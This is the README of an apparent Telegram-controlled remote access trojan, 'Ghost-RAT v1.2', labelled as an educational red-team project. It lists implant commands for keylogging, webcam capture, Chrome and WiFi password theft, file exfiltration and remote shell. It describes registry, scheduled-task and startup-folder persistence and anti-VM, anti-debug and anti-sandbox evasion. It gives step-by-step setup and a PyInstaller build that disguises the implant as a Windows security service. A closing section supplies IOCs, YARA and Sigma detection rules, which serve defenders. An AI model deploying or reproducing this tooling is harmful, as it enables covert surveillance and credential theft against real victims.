# 👻 Ghost-RAT v1.2

### Advanced Telegram C2 Remote Access Tool — Educational Red Team Project

---

> ⚠️ **LEGAL DISCLAIMER & ETHICAL WARNING**
>
> Ghost-RAT is **STRICTLY** for:
> - **SOC (Security Operations Center) testing** and analysis
> - **Red team lab exercises** in isolated environments
> - **Malware behavior research** and detection technique development
> - **Cybersecurity education** and training
>
> **You MUST only use this on systems you own or have explicit written permission to test.**
> Unauthorized access to computer systems is **illegal** under the CFAA, IT Act 2000, and equivalent laws worldwide.
>
> **The authors take no responsibility for misuse.**

---

## 📋 Table of Contents

- [What's New in v1.2](#whats-new-in-v12)
- [Architecture](#architecture)
- [Features](#features)
- [File Structure](#file-structure)
- [Setup Guide](#setup-guide)
- [Building the Implant](#building-the-implant)
- [Usage Guide](#usage-guide)
- [Command Reference](#command-reference)
- [Detection & Analysis (Blue Team)](#detection--analysis-blue-team)
- [Troubleshooting](#troubleshooting)

---

## 🆕 What's New in v1.2

| Feature | Description |
|---------|-------------|
| **Anti-VM / Anti-Debug** | Detects VMware, VirtualBox, Hyper-V, debuggers, and sandboxes |
| **String Obfuscation** | XOR + base64 encoding defeats basic `strings` analysis |
| **Non-Blocking Keylogger** | Runs in background thread — no longer freezes the polling loop |
| **Exponential Backoff** | Smart retry on network failures (avoids burning bandwidth) |
| **Connection Pooling** | `requests.Session()` for keep-alive and performance |
| **Evasion Reporting** | Check-in messages include evasion mode and detection results |
| **Browser Decrypt Fix** | Proper AES-GCM error handling, DPAPI prefix validation |
| **Command History** | `/logs` command on C2 for audit trail |
| **Improved Build** | Better PyInstaller command with hidden imports and fake name |

---

## 🏗️ Architecture

Ghost-RAT uses **two separate Telegram bots** to avoid Telegram's `getUpdates` single-consumer limitation:

```
┌──────────────────────┐                              ┌──────────────────────┐
│   VICTIM (Windows)   │                              │   ATTACKER (Linux)   │
│                      │    ┌──────────────────────┐  │                      │
│  Ghost-RAT.exe       │    │   Private Telegram   │  │  c2_server.py        │
│  Uses: BOT_TOKEN     │───►│       Group          │◄─│  Uses: C2_BOT_TOKEN  │
│  (Implant Bot)       │    │                      │  │  (Observer Bot)      │
│  - Polls getUpdates  │    │  Both bots are       │  │  - Polls getUpdates  │
│  - Sends results     │    │  members of this     │  │  - Reads check-ins   │
│  - Executes commands │    │  group               │  │  - Logs activity     │
│  - Anti-VM checks    │    └──────────────────────┘  │  - SQLite tracking   │
│  - String obfuscation│                              │  - Command history   │
└──────────────────────┘                              └──────────────────────┘
```

**Implant Startup Flow:**
1. Acquire mutex (prevent duplicates)
2. Run anti-VM / anti-debug checks (configurable behavior)
3. Generate unique victim ID (hardware fingerprint)
4. Install persistence (3 methods)
5. Check-in to Telegram group (with retry + backoff)
6. Poll for commands with jitter

---

## ✨ Features

### Core
| Feature | Description |
|---------|-------------|
| Unique Victim ID | SHA-256 of hostname + MAC + username + disk serial → `GHOST-XXXXXXXX` |
| Persistence | Registry Run + Scheduled Task + Startup Folder (3 methods) |
| Jitter | 30-60s randomized intervals |
| Multi-victim | Target specific victims or broadcast `@all` |
| Mutex | Prevents duplicate instances |
| Retry + Backoff | Exponential backoff on consecutive network failures |
| Heartbeat | Periodic re-check-in to keep `last_seen` fresh |

### Security / Evasion
| Feature | Description |
|---------|-------------|
| Anti-VM | Registry keys, WMI model, MAC OUI, guest tool files |
| Anti-Debug | `IsDebuggerPresent()`, `CheckRemoteDebuggerPresent()` |
| Anti-Sandbox | Low resources, analysis tools, sandbox usernames, uptime |
| String Obfuscation | XOR + base64 for API URLs, registry paths, mutex names |
| Evasion Modes | `exit` (quit), `report` (log + continue), `disabled` (skip) |

### Implant Commands (22)
| Command | Description |
|---------|-------------|
| `/sysinfo` | OS, hostname, IP, user, arch |
| `/screenshot` | Capture screen |
| `/webcam` | Webcam snapshot |
| `/shell <cmd>` | Execute shell command |
| `/cd <path>` | Change directory |
| `/ls [path]` | List directory |
| `/upload <path>` | Exfiltrate file |
| `/download <url> <path>` | Download file to victim |
| `/clipboard` | Dump clipboard |
| `/wifi` | Saved WiFi passwords |
| `/keylog [secs]` | Capture keystrokes (non-blocking) |
| `/keylog_stop` | Stop active keylogger |
| `/search <pattern>` | Search files |
| `/browsers` | Chrome passwords (DPAPI + AES-GCM) |
| `/proclist` | List processes |
| `/prockill <pid>` | Kill process |
| `/antivm` | Check VM/debug/sandbox status |
| `/shutdown` | Shutdown machine |
| `/restart` | Restart machine |
| `/selfdestruct` | Remove & delete implant |
| `/help` | Show help |

### C2 Server Commands
| Command | Description |
|---------|-------------|
| `/victims` | List all registered victims |
| `/remove <id>` | Remove a victim |
| `/logs [N]` | Show recent command history |
| `/help` | Show help |

---

## 📁 File Structure

```
ghost-rat/
├── implant.py              # Windows implant payload (v1.2)
├── c2_server.py            # Linux C2 server (observer bot)
├── config.py               # Configuration (tokens, evasion mode, timing)
├── requirements.txt        # Python dependencies
├── README.md               # This file
├── utils/
│   ├── __init__.py
│   ├── victim_id.py        # Unique victim ID generation
│   ├── persistence.py      # Registry + schtask + startup folder
│   ├── evasion.py          # Anti-VM / anti-debug / anti-sandbox [NEW]
│   └── obfuscation.py      # XOR + base64 string obfuscation [NEW]
├── commands/
│   ├── __init__.py
│   └── handler.py          # Command dispatcher (22 commands)
└── dist/
    └── WindowsSecurityHealthService.exe   # Compiled implant
```

---

## 🛠️ Setup Guide

### Prerequisites
- **Python 3.9+**
- A **Telegram account**
- **Windows VM** (victim — isolated!)
- **Linux machine** (attacker — or WSL)

### Step 1: Create the Implant Bot
1. Message **@BotFather** → `/newbot` → name it e.g. `GhostImplantBot`
2. Copy the **Bot Token** → `BOT_TOKEN`

### Step 2: Create the Observer Bot (C2)
1. Message **@BotFather** → `/newbot` → name it e.g. `GhostC2Bot`
2. Copy the **Bot Token** → `C2_BOT_TOKEN`

### Step 3: Create a Private Group
1. Create a group, add **both bots**
2. Send a message, visit `https://api.telegram.org/bot<BOT_TOKEN>/getUpdates`
3. Find `"chat": {"id": -100XXXXXXXXXX}` → `GROUP_CHAT_ID`

### Step 4: Configure
Edit `config.py`:
```python
BOT_TOKEN = "1234567890:ABCdef..."          # Implant bot
C2_BOT_TOKEN = "0987654321:ZYXwvu..."       # Observer bot
GROUP_CHAT_ID = "-100XXXXXXXXXX"
EVASION_MODE = "report"                      # "exit", "report", or "disabled"
```

### Step 5: Install Dependencies
```bash
pip install -r requirements.txt
```

---

## 🔨 Building the Implant

### Recommended build command:

```bash
pyinstaller --onefile --noconsole \
  --name WindowsSecurityHealthService \
  --hidden-import=pynput.keyboard._win32 \
  --hidden-import=pynput.mouse._win32 \
  implant.py
```

### With a custom icon:
```bash
pyinstaller --onefile --noconsole \
  --name WindowsSecurityHealthService \
  --icon=myicon.ico \
  --hidden-import=pynput.keyboard._win32 \
  --hidden-import=pynput.mouse._win32 \
  implant.py
```

### With UPX compression:
```bash
pyinstaller --onefile --noconsole \
  --name WindowsSecurityHealthService \
  --upx-dir=/path/to/upx \
  --hidden-import=pynput.keyboard._win32 \
  --hidden-import=pynput.mouse._win32 \
  implant.py
```

**Output**: `dist/WindowsSecurityHealthService.exe`

> **Why `WindowsSecurityHealthService`?** The name mimics a legitimate Windows service. This is for educational purposes — to demonstrate how real malware blends in.

---

## 🚀 Usage Guide

### 1. Start C2 Server
```bash
python3 c2_server.py
```

### 2. Deploy Implant
Copy `.exe` to Windows VM and run it.

### 3. Send Commands
```
GHOST-A1B2C3D4 /sysinfo
GHOST-A1B2C3D4 /screenshot
@all /proclist
```

### 4. View Victims & Logs
```
/victims
/logs 10
```

---

## 🔬 Detection & Analysis (Blue Team)

### Network Indicators (IOCs)
- **DNS**: Queries to `api.telegram.org`
- **HTTPS**: Periodic POST/GET to `https://api.telegram.org/bot*/...`
- **Beaconing**: Regular 30-60s intervals with slight jitter (look for periodicity)
- **Backoff Pattern**: Intervals increase exponentially on failures (behavioral signature)
- **User-Agent**: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`
- **Two Bot Tokens**: Traffic to two different bot endpoints from the same network

### Host Indicators (IOCs)
| Artifact | Location |
|----------|----------|
| Registry Key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityHealth` |
| Scheduled Task | `WindowsSecurityHealth` in Task Scheduler |
| Startup Folder | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurityHealth.exe` |
| Victim ID File | `%APPDATA%\.ghost_id` (hidden) |
| Mutex | `Global\GhostRAT_WindowsSecurityHealth` |
| Process | `WindowsSecurityHealthService.exe` (unsigned, network connections) |
| Temp Files | `%TEMP%\ss_*.png`, `%TEMP%\cam_*.png`, `%TEMP%\login_data_*.db` |

### Anti-Analysis Detection (for analysts)
Ghost-RAT v1.2 checks for analysis environments. Analysts should be aware:
- **VM Detection**: Checks registry for VMware/VirtualBox keys, WMI model strings, MAC OUI prefixes, guest tool files
- **Debugger Detection**: `IsDebuggerPresent()` and `CheckRemoteDebuggerPresent()` Windows API calls
- **Sandbox Detection**: CPU count < 2, RAM < 2GB, analysis tool processes (wireshark, procmon, x64dbg, etc.), sandbox usernames, system uptime < 10 minutes
- **Bypass**: Set `EVASION_MODE = "disabled"` in `config.py` for lab analysis, or use `ScyllaHide` to hide debuggers

### String Obfuscation Analysis
- Strings are XOR'd with key `0x5A` and base64-encoded
- To decode: `echo "ENCODED_STRING" | base64 -d | python3 -c "import sys; print(bytes(b^0x5A for b in sys.stdin.buffer.read()).decode())"` 
- Look for `base64.b64decode` and XOR patterns in decompiled code

### YARA Rule
```yara
rule Ghost_RAT_v12 {
    meta:
        description = "Detects Ghost-RAT v1.2 implant"
        author = "SOC Team"
        severity = "high"
        version = "1.2"
    strings:
        $checkin = "GHOST-RAT CHECK-IN" ascii wide
        $ghost_id = "ghost_id" ascii
        $implant_name = "WindowsSecurityHealth" ascii
        $telegram = "api.telegram.org" ascii
        $mutex_pattern = "GhostRAT_" ascii
        $evasion1 = "IsDebuggerPresent" ascii
        $evasion2 = "CheckRemoteDebuggerPresent" ascii
        $obf_xor = { 5A }
        $b64_decode = "b64decode" ascii
    condition:
        uint16(0) == 0x5A4D and    // MZ header (PE file)
        3 of ($checkin, $ghost_id, $implant_name, $telegram, $mutex_pattern) or
        (2 of ($evasion1, $evasion2) and $b64_decode)
}
```

### Sigma Rules

#### Registry Persistence
```yaml
title: Ghost-RAT Registry Persistence
status: experimental
logsource:
    category: registry_set
    product: windows
detection:
    selection:
        TargetObject|contains: 'WindowsSecurityHealth'
        EventType: SetValue
    condition: selection
level: high
```

#### Scheduled Task Creation
```yaml
title: Ghost-RAT Scheduled Task
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains|all:
            - 'schtasks'
            - 'WindowsSecurityHealth'
            - 'ONLOGON'
    condition: selection
level: high
```

#### Mutex Detection
```yaml
title: Ghost-RAT Mutex
status: experimental
logsource:
    category: create_mutex
    product: windows
detection:
    selection:
        MutexName|contains: 'GhostRAT_'
    condition: selection
level: critical
```

#### Telegram Beaconing
```yaml
title: Ghost-RAT Telegram C2 Beaconing
status: experimental
logsource:
    category: proxy
detection:
    selection:
        dst|contains: 'api.telegram.org'
        http_method: 'POST'
    timeframe: 5m
    condition: selection | count() > 3
level: medium
```

---

## 🔧 Troubleshooting

### Config Errors
| Error | Fix |
|-------|-----|
| `BOT_TOKEN not configured!` | Edit `config.py` with your implant bot token |
| `C2_BOT_TOKEN not configured!` | Create a 2nd bot via @BotFather for C2 |
| `GROUP_CHAT_ID not configured!` | Find chat ID via Telegram API |

### Implant Issues
| Issue | Fix |
|-------|-----|
| Implant exits immediately | Check `EVASION_MODE` — set to `"disabled"` in VMs |
| No check-in received | Verify both bots are in the group + internet access |
| Commands not executing | Ensure correct victim ID format + message from group |
| Keylogger not returning results | v1.2 keylogger is non-blocking — results arrive after duration |

### Build Issues
| Issue | Fix |
|-------|-----|
| PyInstaller fails | `pip install --upgrade pyinstaller` |
| pynput missing in .exe | Add `--hidden-import=pynput.keyboard._win32` |
| Large .exe size | Use UPX compression: `--upx-dir=/path/to/upx` |

---

## 📜 License

Educational purposes only. No warranty. Use responsibly and legally.

---

*Built for cybersecurity education and defensive research. Ghost-RAT v1.2*
